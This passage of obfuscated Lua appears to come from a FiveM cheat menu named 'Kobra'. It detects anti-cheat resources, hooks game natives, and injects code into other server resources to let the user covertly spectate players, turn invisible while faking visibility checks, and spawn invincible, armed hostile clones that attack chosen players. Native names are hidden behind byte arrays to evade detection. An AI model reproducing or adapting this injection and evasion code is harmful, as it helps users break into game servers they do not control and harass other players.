            ]],v208,v319));v209=v209 + 1 ;end end v205:Notify("success","Kobra",string.format("Object '%s' spawned on %d/%d player(s)!",v207,v209, #v206),5000);end;v12.HandleSpectateToggle=function(v210,v211,v212) if  not v211 then local v544=0 + 0 ;while true do if (v544==0) then v210:Notify("error","Kobra","Invalid player ID provided!",3000);return;end end end local v213=tonumber(v211);if  not v213 then local v545=0 -0 ;while true do if (v545==0) then v210:Notify("error","Kobra","Invalid server ID format!",2814 + 186 );return;end end end if (v213==tonumber(GetPlayerServerId(PlayerId()))) then v210:Notify("error","Kobra","You cannot spectate yourself!",3000);return;end if v212 then v210:Notify("success","Kobra",("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v213)) or "Unknown" ,v213),3689 -(586 + 103) );else v210:Notify("error","Kobra",("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v213)) or "Unknown" ,v213),274 + 2726 );end local v214=GetResourceState("ReaperV4")=="started" ;if v214 then print("Spectate Fallback #3 (ReaperV4 detected, running direct)");if  not GetPlayerName(GetPlayerFromServerId(v213)) then local v699=0 -0 ;while true do if ((1488 -(1309 + 179))==v699) then v210:Notify("error","Kobra","Target player not found!",5415 -2415 );print("[ReaperV4 Spectate] Error: No player found for server ID:",v213);v699=1;end if ((1 + 0)==v699) then return;end end end local v546=string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]],tostring(v212),v213);local v547,v548=load(v546);if v547 then local v700=0 -0 ;local v701;local v702;while true do if (v700==(0 + 0)) then v701,v702=pcall(v547);if  not v701 then print("[ReaperV4 Spectate] Execution error:",v702);v210:Notify("error","Kobra","Failed to execute spectate code!",6374 -3374 );else print("[ReaperV4 Spectate] Code executed successfully");end break;end end else local v703=0 -0 ;while true do if (v703==(609 -(295 + 314))) then print("[ReaperV4 Spectate] Load error:",v548);v210:Notify("error","Kobra","Failed to load spectate code!",7368 -4368 );break;end end end elseif ((GetResourceState("FiniAC")=="started") or (GetResourceState("ElectronAC")=="started")) then print("Spectate Fallback #1");MachoInjectResourceRaw("any",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v212),v213));else print("Spectate Fallback #2");MachoInjectResourceRaw("monitor",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v212),v213));end end;local v74={"envi-medic","envi-hud","envi-yoga","envi-chopshop","envi-chopshop-v2","envi-foodtrucks","envi-dumpsters","envi-prescriptions","envi-druglabs","lation_laundering"};local function v75() local v215=0 + 0 ;while true do if (v215==0) then for v704,v705 in ipairs(v74) do if (GetResourceState(v705)=="started") then return v705;end end return nil;end end end local v76=nil;if ((GetResourceState("es_extended")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="es_extended";elseif ((GetResourceState("core")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="core";end v12.EnableInvisibility=function(v216) local function v217(v320,v321) local v322=0 -0 ;local v323;while true do if (v322==1) then _G[v320]=function(...) return v321(v323,...);end;break;end if (v322==(0 -0)) then v323=_G[v320];if ( not v323 or (type(v323)~="function")) then return;end v322=1;end end end v217("CreateThread",function(v324,...) return v324(...);end);v217("PlayerPedId",function(v325,...) return v325(...);end);v217("IsEntityVisible",function(v326,...) return true;end);v217("IsEntityVisibleToScript",function(v327,...) return true;end);v217("SetEntityVisible",function(v328,v329,v330,v331) local v332=0;while true do if (v332==0) then if (_G.osintInvisibility and _G.osintInvisibility.enabled) then return v328(v329,false,v331);end return v328(v329,v330,v331);end end end);if  not _G.osintInvisibility then _G.osintInvisibility={enabled=false,wasVisible=true};end if  not _G.osintInvisibility.enabled then local v549=302 -(115 + 187) ;local v550;while true do if (v549==(1 + 0)) then _G.osintInvisibility.wasVisible=IsEntityVisible(v550);SetEntityVisible(v550,false,false);v549=2 + 0 ;end if (v549==(7 -5)) then CreateThread(function() while _G.osintInvisibility and _G.osintInvisibility.enabled  do local v938=0;local v939;while true do if (v938==1) then Wait(500);break;end if (v938==(1161 -(160 + 1001))) then v939=PlayerPedId();if (v939 and DoesEntityExist(v939)) then SetEntityVisible(v939,false,false);end v938=1 + 0 ;end end end end);break;end if ((0 + 0)==v549) then _G.osintInvisibility.enabled=true;v550=PlayerPedId();v549=1 -0 ;end end end end;v12.DisableInvisibility=function(v218) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then _G.osintInvisibility.enabled=false;local v551=PlayerPedId();if (v551 and DoesEntityExist(v551)) then SetEntityVisible(v551,_G.osintInvisibility.wasVisible,false);end end end;v12.HandleAttackClonePlayer=function(v219,v220) if ( not v220 or ( #v220==0)) then return;end local v221=table.concat(v220,",");MachoHookNative(2596915000000000000,function(v333) return true,v333;end);MachoHookNative(15321135000000000000 -(237 + 121) ,function(v334,v335,v336,v337,v338,v339,v340) return true,v334,v335,v336,v337,v338,v339,v340;end);MachoInjectResourceRaw("monitor",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
